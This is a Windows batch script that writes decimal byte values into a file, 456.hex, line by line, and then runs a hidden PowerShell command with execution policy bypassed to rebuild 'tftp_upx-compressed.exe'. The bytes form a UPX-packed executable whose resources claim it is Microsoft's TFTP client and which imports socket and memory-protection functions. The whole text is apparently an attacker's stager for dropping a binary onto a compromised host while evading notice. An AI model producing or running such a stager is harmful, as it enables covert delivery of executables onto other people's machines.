echo|set /p=33 189 6 96 195 67 161 195 67 146 182 9 39 41 189 111 243 38 8 155 189 47 101 207 97 70 42 236 60 105 207 163 144 46 200 86 207 48 147 135 107 154 24 58 175 87 65 3 177 0 156 247 222 114 91 23 47 200 22 16 149 163 10 255 7 57 168 180 1 77 111 118 101 70 105 108 101 65 254 15 219 46 68 101 6 116 12 76 111 99 97 108 70 114 101 101 219 110 255 223 10 73 115 68 66 67 83 76 101 97 100 66 121 31 69 120 17 71 39 177 2 208 88 31 84 177 13 255 >>456.hex
echo|set /p=34 223 110 69 100 117 60 72 97 110 100 31 97 115 116 69 237 183 219 242 114 114 111 114 70 4 109 97 34 101 115 115 97 103 29 183 219 211 108 123 193 116 95 81 106 117 38 95 102 176 237 219 238 100 105 118 13 95 112 2 99 111 109 109 75 101 13 111 91 59 108 102 11 115 80 44 112 17 116 121 112 125 247 118 123 15 37 110 116 90 108 102 112 11 101 120 99 101 112 218 118 59 182 29 104 123 114 51 17 102 111 35 110 6 127 239 150 128 15 99 12 99 108 111 115 50 117 110 >>456.hex
echo|set /p=108 218 176 247 238 105 110 107 8 119 114 105 116 16 24 21 103 205 181 214 15 16 161 10 135 58 102 218 93 219 98 246 179 108 34 66 105 115 112 50 214 254 58 215 111 22 82 115 49 116 111 97 6 209 108 223 108 239 111 105 51 6 108 67 73 112 111 119 51 99 251 230 206 130 50 102 24 241 116 112 105 100 8 23 187 240 158 90 174 19 110 111 61 54 107 239 189 181 252 13 105 99 109 199 41 114 53 246 182 216 123 97 114 103 100 151 49 118 169 226 57 67 219 181 10 7 88 99 >>456.hex
echo|set /p=231 157 172 14 27 236 236 71 19 99 8 102 112 116 97 231 102 17 146 20 81 139 95 114 185 130 251 181 152 107 116 189 111 98 5 174 238 161 61 188 115 87 117 3 158 104 152 130 225 193 102 144 143 97 99 99 177 173 237 208 62 205 204 36 115 95 193 208 18 133 182 125 154 216 44 67 104 173 78 107 232 77 195 255 217 120 65 12 84 111 79 101 109 66 117 102 102 230 227 56 150 101 217 54 255 23 2 2 6 3 17 9 5 183 197 149 143 100 174 168 106 177 214 220 178 13 26 255 >>456.hex
echo|set /p=191 12 203 178 44 219 255 9 2 15 18 55 115 20 232 14 138 25 176 8 76 1 3 246 31 214 9 252 128 224 0 15 1 11 1 7 167 186 71 112 118 30 19 141 53 3 64 207 108 99 51 231 11 2 10 5 3 86 126 219 176 4 60 235 0 12 174 85 85 188 217 123 239 0 128 12 43 4 7 6 151 103 121 9 33 180 45 120 80 96 26 0 89 94 33 64 17 28 41 26 172 27 80 147 124 100 48 141 216 206 240 10 46 116 103 7 94 34 144 176 187 176 47 235 4 35 32 146 >>456.hex
echo|set /p=46 100 95 144 91 163 203 157 251 132 2 7 40 214 248 45 100 155 2 192 46 114 115 114 28 195 45 101 99 111 203 172 42 39 2 40 4 61 183 96 13 92 47 185 96 0 0 0 0 0 0 36 0 255 0 0 0 0 0 0 0 0 0 0 96 190 0 112 0 1 141 190 0 160 255 255 87 131 205 255 235 16 144 144 144 144 144 144 138 6 70 136 7 71 1 219 117 7 139 30 131 238 252 17 219 114 237 184 1 0 0 0 1 219 117 7 139 30 131 238 252 17 219 17 192 1 219 115 >>456.hex
echo|set /p=239 117 9 139 30 131 238 252 17 219 115 228 49 201 131 232 3 114 13 193 224 8 138 6 70 131 240 255 116 116 137 197 1 219 117 7 139 30 131 238 252 17 219 17 201 1 219 117 7 139 30 131 238 252 17 219 17 201 117 32 65 1 219 117 7 139 30 131 238 252 17 219 17 201 1 219 115 239 117 9 139 30 131 238 252 17 219 115 228 131 193 2 129 253 0 243 255 255 131 209 1 141 20 47 131 253 252 118 15 138 2 66 136 7 71 73 117 247 233 99 255 255 255 144 139 2 131 194 >>456.hex
echo|set /p=4 137 7 131 199 4 131 233 4 119 241 1 207 233 76 255 255 255 94 137 247 185 131 0 0 0 138 7 71 44 232 60 1 119 247 128 63 1 117 242 139 7 138 95 4 102 193 232 8 193 192 16 134 196 41 248 128 235 232 1 240 137 7 131 199 5 136 216 226 217 141 190 0 96 0 0 139 7 9 192 116 69 139 95 4 141 132 48 100 132 0 0 1 243 80 131 199 8 255 150 220 132 0 0 149 138 7 71 8 192 116 220 137 249 121 7 15 183 7 71 80 71 185 87 72 242 174 85 >>456.hex
echo|set /p=255 150 224 132 0 0 9 192 116 7 137 3 131 195 4 235 216 255 150 240 132 0 0 139 174 228 132 0 0 141 190 0 240 255 255 187 0 16 0 0 80 84 106 4 83 87 255 213 141 135 255 1 0 0 128 32 127 128 96 40 127 88 80 84 80 83 87 255 213 88 97 141 68 36 128 106 0 57 196 117 250 131 236 128 233 180 144 255 255 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 4 0 0 0 0 0 2 0 11 0 0 0 32 0 0 128 16 0 0 0 96 0 0 128 0 0 0 0 0 0 0 0 4 0 0 0 0 0 1 0 1 0 0 0 56 0 0 128 0 0 0 0 0 0 0 0 4 0 0 0 0 0 1 0 12 4 0 0 80 0 0 0 160 80 0 0 0 22 0 0 228 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 0 0 0 0 0 1 0 1 0 0 0 120 0 0 128 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=4 0 0 0 0 0 1 0 12 4 0 0 144 0 0 0 164 144 0 0 192 3 0 0 228 4 0 0 0 0 0 0 160 102 0 0 192 3 52 0 0 0 86 0 83 0 95 0 86 0 69 0 82 0 83 0 73 0 79 0 78 0 95 0 73 0 78 0 70 0 79 0 0 0 0 0 189 4 239 254 0 0 1 0 1 0 5 0 0 0 40 10 1 0 5 0 0 0 40 10 63 0 0 0 0 0 0 0 4 0 4 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=32 3 0 0 1 0 83 0 116 0 114 0 105 0 110 0 103 0 70 0 105 0 108 0 101 0 73 0 110 0 102 0 111 0 0 0 252 2 0 0 1 0 48 0 52 0 48 0 67 0 48 0 52 0 66 0 48 0 0 0 76 0 22 0 1 0 67 0 111 0 109 0 112 0 97 0 110 0 121 0 78 0 97 0 109 0 101 0 0 0 0 0 77 0 105 0 99 0 114 0 111 0 115 0 111 0 102 0 116 0 32 0 67 0 111 0 114 0 112 0 111 0 114 0 97 0 116 0 >>456.hex
echo|set /p=105 0 111 0 110 0 0 0 140 0 50 0 1 0 70 0 105 0 108 0 101 0 68 0 101 0 115 0 99 0 114 0 105 0 112 0 116 0 105 0 111 0 110 0 0 0 0 0 65 0 112 0 112 0 108 0 105 0 99 0 97 0 116 0 105 0 111 0 110 0 32 0 84 0 70 0 84 0 80 0 32 0 40 0 84 0 114 0 105 0 118 0 105 0 97 0 108 0 32 0 70 0 105 0 108 0 101 0 32 0 84 0 114 0 97 0 110 0 115 0 102 0 101 0 114 0 32 0 >>456.hex
echo|set /p=80 0 114 0 111 0 116 0 111 0 99 0 111 0 108 0 41 0 0 0 100 0 34 0 1 0 70 0 105 0 108 0 101 0 86 0 101 0 114 0 115 0 105 0 111 0 110 0 0 0 0 0 53 0 46 0 49 0 46 0 50 0 54 0 48 0 48 0 46 0 48 0 32 0 40 0 120 0 112 0 99 0 108 0 105 0 101 0 110 0 116 0 46 0 48 0 49 0 48 0 56 0 49 0 55 0 45 0 49 0 49 0 52 0 56 0 41 0 0 0 52 0 9 0 1 0 73 0 >>456.hex
echo|set /p=110 0 116 0 101 0 114 0 110 0 97 0 108 0 78 0 97 0 109 0 101 0 0 0 116 0 102 0 116 0 112 0 46 0 101 0 120 0 101 0 0 0 0 0 130 0 47 0 1 0 76 0 101 0 103 0 97 0 108 0 67 0 111 0 112 0 121 0 114 0 105 0 103 0 104 0 116 0 0 0 169 0 32 0 77 0 105 0 99 0 114 0 111 0 115 0 111 0 102 0 116 0 32 0 67 0 111 0 114 0 112 0 111 0 114 0 97 0 116 0 105 0 111 0 110 0 46 0 >>456.hex
echo|set /p=32 0 84 0 111 0 117 0 115 0 32 0 100 0 114 0 111 0 105 0 116 0 115 0 32 0 114 0 233 0 115 0 101 0 114 0 118 0 233 0 115 0 46 0 0 0 0 0 60 0 9 0 1 0 79 0 114 0 105 0 103 0 105 0 110 0 97 0 108 0 70 0 105 0 108 0 101 0 110 0 97 0 109 0 101 0 0 0 116 0 102 0 116 0 112 0 46 0 101 0 120 0 101 0 0 0 0 0 120 0 43 0 1 0 80 0 114 0 111 0 100 0 117 0 99 0 116 0 >>456.hex
echo|set /p=78 0 97 0 109 0 101 0 0 0 0 0 83 0 121 0 115 0 116 0 232 0 109 0 101 0 32 0 100 0 39 0 101 0 120 0 112 0 108 0 111 0 105 0 116 0 97 0 116 0 105 0 111 0 110 0 32 0 77 0 105 0 99 0 114 0 111 0 115 0 111 0 102 0 116 0 174 0 32 0 87 0 105 0 110 0 100 0 111 0 119 0 115 0 174 0 0 0 0 0 59 0 11 0 1 0 80 0 114 0 111 0 100 0 117 0 99 0 116 0 86 0 101 0 114 0 115 0 >>456.hex
echo|set /p=105 0 111 0 110 0 0 0 53 0 46 0 49 0 46 0 50 0 54 0 48 0 48 0 46 0 48 0 0 0 0 0 68 0 0 0 1 0 86 0 97 0 114 0 70 0 105 0 108 0 101 0 73 0 110 0 102 0 111 0 0 0 0 0 36 0 4 0 0 0 84 0 114 0 97 0 110 0 115 0 108 0 97 0 116 0 105 0 111 0 110 0 0 0 0 0 12 4 176 4 0 0 0 0 0 0 0 0 0 0 0 0 24 149 0 0 220 148 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 37 149 0 0 248 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 149 0 0 0 149 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 149 0 0 8 149 0 0 0 0 0 0 0 0 0 0 0 0 0 0 71 149 0 0 16 149 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 82 149 0 0 96 149 0 0 112 149 0 0 128 149 0 0 142 149 0 0 156 149 0 0 0 0 0 0 170 149 0 0 0 0 0 0 >>456.hex
echo|set /p=176 149 0 0 0 0 0 0 186 149 0 0 0 0 0 0 20 0 0 128 0 0 0 0 75 69 82 78 69 76 51 50 46 68 76 76 0 109 115 118 99 114 116 46 100 108 108 0 77 83 87 83 79 67 75 46 100 108 108 0 85 83 69 82 51 50 46 100 108 108 0 87 83 50 95 51 50 46 100 108 108 0 0 0 76 111 97 100 76 105 98 114 97 114 121 65 0 0 71 101 116 80 114 111 99 65 100 100 114 101 115 115 0 0 86 105 114 116 117 97 108 80 114 111 116 101 99 116 >>456.hex
echo|set /p=0 0 86 105 114 116 117 97 108 65 108 108 111 99 0 0 86 105 114 116 117 97 108 70 114 101 101 0 0 0 69 120 105 116 80 114 111 99 101 115 115 0 0 0 112 117 116 99 0 0 115 95 112 101 114 114 111 114 0 0 67 104 97 114 78 101 120 116 69 120 65 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=>>456.hex
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "[string]$hex = get-content -path 456.hex;[Byte[]] $temp = $hex -split ' ';[System.IO.File]::WriteAllBytes('tftp_upx-compressed.exe', $temp)"
